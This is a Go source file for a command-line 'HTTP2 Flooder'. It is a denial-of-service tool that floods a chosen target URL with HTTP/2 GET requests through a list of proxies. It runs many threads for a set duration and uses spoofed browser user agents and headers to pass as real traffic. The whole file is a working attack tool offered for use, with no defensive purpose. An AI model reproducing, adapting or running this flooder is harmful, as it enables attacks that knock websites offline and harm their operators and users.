package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var proxies = []string{}

func http2(target string, rps int) {
restart:
	proxy := fmt.Sprintf("http://%s", proxies[rand.Intn(len(proxies))])
	config := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
		NextProtos:         []string{"h2"},
		CurvePreferences: []tls.CurveID{
			tls.X25519,
			tls.CurveP256,
			tls.CurveP384,
			tls.CurveP521,
		},
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		PreferServerCipherSuites: true,
	}
	url, _ := url.Parse(proxy)
	httptransport := &http.Transport{
		Proxy:               http.ProxyURL(url),
		ForceAttemptHTTP2:   true,
		TLSClientConfig:     config,
		MaxIdleConns:        -1,
		MaxIdleConnsPerHost: -1,
		IdleConnTimeout:     1 * time.Hour,
		Dial: (&net.Dialer{
			Timeout:   5 * time.Second,
			KeepAlive: 1 * time.Hour,
			DualStack: true,
		}).Dial,
		DialTLS: func(network, addr string) (net.Conn, error) {
			dialer := &net.Dialer{
				Timeout: 5 * time.Second,
			}
			conn, err := dialer.Dial(network, addr)
			if err != nil {
				defer conn.Close()
				return nil, err
			}
			defer conn.Close()
			tlsConn := tls.Client(conn, config)
			err = tlsConn.Handshake()
			if err != nil {
				defer tlsConn.Close()
				return nil, err
			}
			defer tlsConn.Close()
			return tlsConn, nil
		},
	}
	client := http.Client{
		Transport: httptransport,
		Timeout:   5 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 3 {
				return nil
			}
			return nil
		},
	}
	// client.Transport, _ = New(client.Transport)
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		goto restart
	}
	version := rand.Intn(20) + 95
	userAgents := []string{fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:%d.0) Gecko/20100101 Firefox/%d.0", version, version), fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36", version)}
	userAgent := rand.Intn(len(userAgents))
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Accept-Language", "de,en-US;q=0.7,en;q=0.3")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("User-Agent", userAgents[userAgent])
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	for i := 0; i < rps; i++ {
		resp, err := client.Do(req)
		if err != nil {
			goto restart
		}
		defer resp.Body.Close()
		if resp.StatusCode >= 400 && resp.StatusCode != 404 {
			goto restart
		}
	}
}

func sendRequests(target string, rps int, quit chan struct{}) {
	for {
		select {
		case <-quit:
			return
		default:
			http2(target, rps)
		}
	}
}

func main() {
	go func() {
		rand.New(rand.NewSource(time.Now().UnixNano()))
	}()
	if len(os.Args) < 6 {
		fmt.Printf("\033[34mHTTP2 Flooder \033[0m- \033[33mMade by @udbnt\033[0m\n\033[31m%s target, duration, rps, proxylist, threads\033[0m", os.Args[0])
		return
	}
	var target string
	var duration int
	var rps int
	var proxylist string
	var threads int
	target = os.Args[1]
	duration, _ = strconv.Atoi(os.Args[2])
	rps, _ = strconv.Atoi(os.Args[3])
	proxylist = os.Args[4]
	threads, _ = strconv.Atoi(os.Args[5])

	file, err := os.Open(proxylist)
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxies = append(proxies, strings.TrimSpace(scanner.Text()))
	}

	if len(proxies) == 0 {
		fmt.Println("No proxies found in the file")
		return
	}

	quit := make(chan struct{})
	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			sendRequests(target, rps, quit)
		}()
		time.Sleep(time.Duration(1) * time.Millisecond)
	}

	time.Sleep(time.Duration(duration) * time.Second)
	close(quit)
	wg.Wait()
}
